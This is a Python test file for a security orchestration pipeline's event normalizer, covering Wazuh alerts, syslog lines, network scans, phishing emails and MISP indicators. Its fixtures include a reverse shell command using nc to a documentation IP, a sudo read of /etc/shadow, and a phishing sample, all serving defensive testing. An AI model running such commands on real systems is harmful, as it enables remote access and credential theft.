"""Event normalization: every source maps into the common schema and keeps the raw event."""
import pytest

from soar.pipeline.normalizer import NormalizationError, normalize, parse_timestamp

WAZUH_BRUTE = {
    "timestamp": "2026-03-06T12:00:00.000+0000",
    "rule": {"id": "100001", "level": 10, "frequency": 5,
             "description": "Multiple SSH authentication failures from the same source IP.",
             "groups": ["local", "syslog", "sshd", "authentication_failures"],
             "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]}},
    "agent": {"id": "001", "name": "kali-vm-01", "ip": "192.168.64.9"},
    "data": {"srcip": "91.219.236.222", "dstuser": "root"},
    "full_log": "sshd: Failed password for root from 91.219.236.222 port 4242 ssh2",
}


def test_wazuh_alert_maps_to_common_schema():
    ev = normalize("wazuh", WAZUH_BRUTE)
    assert ev.source == "wazuh" and ev.event_type == "authentication_failure"
    assert ev.severity == 3  # Wazuh level 10 -> high
    assert ev.source_ip == "91.219.236.222" and ev.source_host == "kali-vm-01"
    assert ev.username == "root" and ev.rule_id == "100001"
    assert ev.metadata["failed_logins"] == 5
    assert ev.metadata["mitre"]["ids"] == ["T1110"]
    assert ev.timestamp.isoformat() == "2026-03-06T12:00:00+00:00"


def test_raw_event_is_preserved_unchanged():
    ev = normalize("wazuh", WAZUH_BRUTE)
    assert ev.raw_event == WAZUH_BRUTE


def test_event_id_is_deterministic_and_source_scoped():
    a, b = normalize("wazuh", WAZUH_BRUTE), normalize("wazuh", dict(WAZUH_BRUTE))
    assert a.event_id == b.event_id
    changed = {**WAZUH_BRUTE, "timestamp": "2026-03-06T12:00:01.000+0000"}
    assert normalize("wazuh", changed).event_id != a.event_id


def test_wazuh_reverse_shell_rule_uses_full_log_as_command():
    alert = {"timestamp": "2026-03-06T12:05:00Z",
             "rule": {"id": "100002", "level": 12, "groups": ["syscheck", "suspicious_activity"],
                      "description": "Suspicious network utility usage detected (Possible Reverse Shell)."},
             "agent": {"name": "web-server-01"}, "full_log": "nc -e /bin/bash 203.0.113.9 4444"}
    ev = normalize("wazuh", alert)
    assert ev.event_type == "suspicious_process" and "nc -e" in ev.command


def test_wazuh_syscheck_captures_hash_and_path():
    alert = {"rule": {"id": "550", "level": 7, "groups": ["syscheck"], "description": "Integrity checksum changed."},
             "agent": {"name": "h1"}, "syscheck": {"path": "/etc/passwd", "sha256_after": "ABCDEF" + "0" * 58}}
    ev = normalize("wazuh", alert)
    assert ev.event_type == "file_integrity" and ev.file_hash == ("abcdef" + "0" * 58)
    assert ev.metadata["fim_path"] == "/etc/passwd"


@pytest.mark.parametrize("level,sev", [(0, 1), (6, 1), (7, 2), (9, 2), (10, 3), (12, 3), (13, 4), (15, 4)])
def test_wazuh_level_to_severity(level, sev):
    ev = normalize("wazuh", {"rule": {"id": "1", "level": level, "description": "x"}, "agent": {"name": "a"}})
    assert ev.severity == sev


def test_syslog_ssh_failure_line():
    line = "Mar  6 12:00:01 kali-vm-01 sshd[123]: Failed password for invalid user admin from 45.33.32.156 port 4242 ssh2"
    ev = normalize("syslog", line)
    assert ev.event_type == "authentication_failure" and ev.username == "admin"
    assert ev.source_ip == "45.33.32.156" and ev.source_host == "kali-vm-01"
    assert ev.raw_event == {"line": line}


def test_syslog_success_and_sudo():
    ok = normalize("syslog", "Mar  6 12:00:01 h1 sshd[1]: Accepted password for bob from 10.0.0.5 port 22 ssh2")
    assert ok.event_type == "authentication_success" and ok.severity == 1
    sudo = normalize("syslog", "Mar  6 12:00:01 h1 sudo: bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/cat /etc/shadow")
    assert sudo.event_type == "privilege_use" and sudo.command == "/bin/cat /etc/shadow"


def test_network_scan_detected_from_port_fanout():
    ev = normalize("network", {"src_ip": "198.51.100.7", "dst_ip": "10.0.0.5", "unique_dst_ports": 40})
    assert ev.event_type == "network_scan" and ev.severity == 3 and ev.source_ip == "198.51.100.7"


def test_email_headers_and_body_are_extracted():
    raw = ("From: IT Support <it@examp1e-corp.com>\nTo: victim@corp.test\nSubject: Verify now\n"
           "Reply-To: attacker@evil.test\nDate: Fri, 06 Mar 2026 12:00:00 +0000\n\n"
           "Click http://examp1e-corp.com/login to verify.")
    ev = normalize("email", {"raw": raw})
    assert ev.event_type == "email_received"
    assert ev.domain == "examp1e-corp.com"
    assert ev.metadata["subject"] == "Verify now" and "http://examp1e-corp.com/login" in ev.metadata["body"]
    assert ev.metadata["reply_to"] == "attacker@evil.test"


def test_misp_attribute_becomes_indicator_event():
    ev = normalize("misp", {"Attribute": {"type": "ip-dst", "value": "203.0.113.50", "to_ids": True}})
    assert ev.event_type == "threat_intel_indicator" and ev.destination_ip == "203.0.113.50"


def test_generic_event_passthrough_and_invalid_ip_dropped():
    ev = normalize("generic", {"event_type": "custom", "severity": 3, "src_ip": "not-an-ip", "host": "h9"})
    assert ev.severity == 3 and ev.source_ip is None and ev.source_host == "h9"


@pytest.mark.parametrize("source,payload", [("nope", {}), ("wazuh", "a string"), ("misp", {"type": "weird"})])
def test_bad_input_is_rejected_cleanly(source, payload):
    with pytest.raises(NormalizationError):
        normalize(source, payload)


def test_timestamp_formats():
    assert parse_timestamp("2026-03-06T12:00:00+0000").hour == 12
    assert parse_timestamp(1772798400).year == 2026
    assert parse_timestamp(1772798400000).year == 2026  # milliseconds
    assert parse_timestamp("garbage").tzinfo is not None
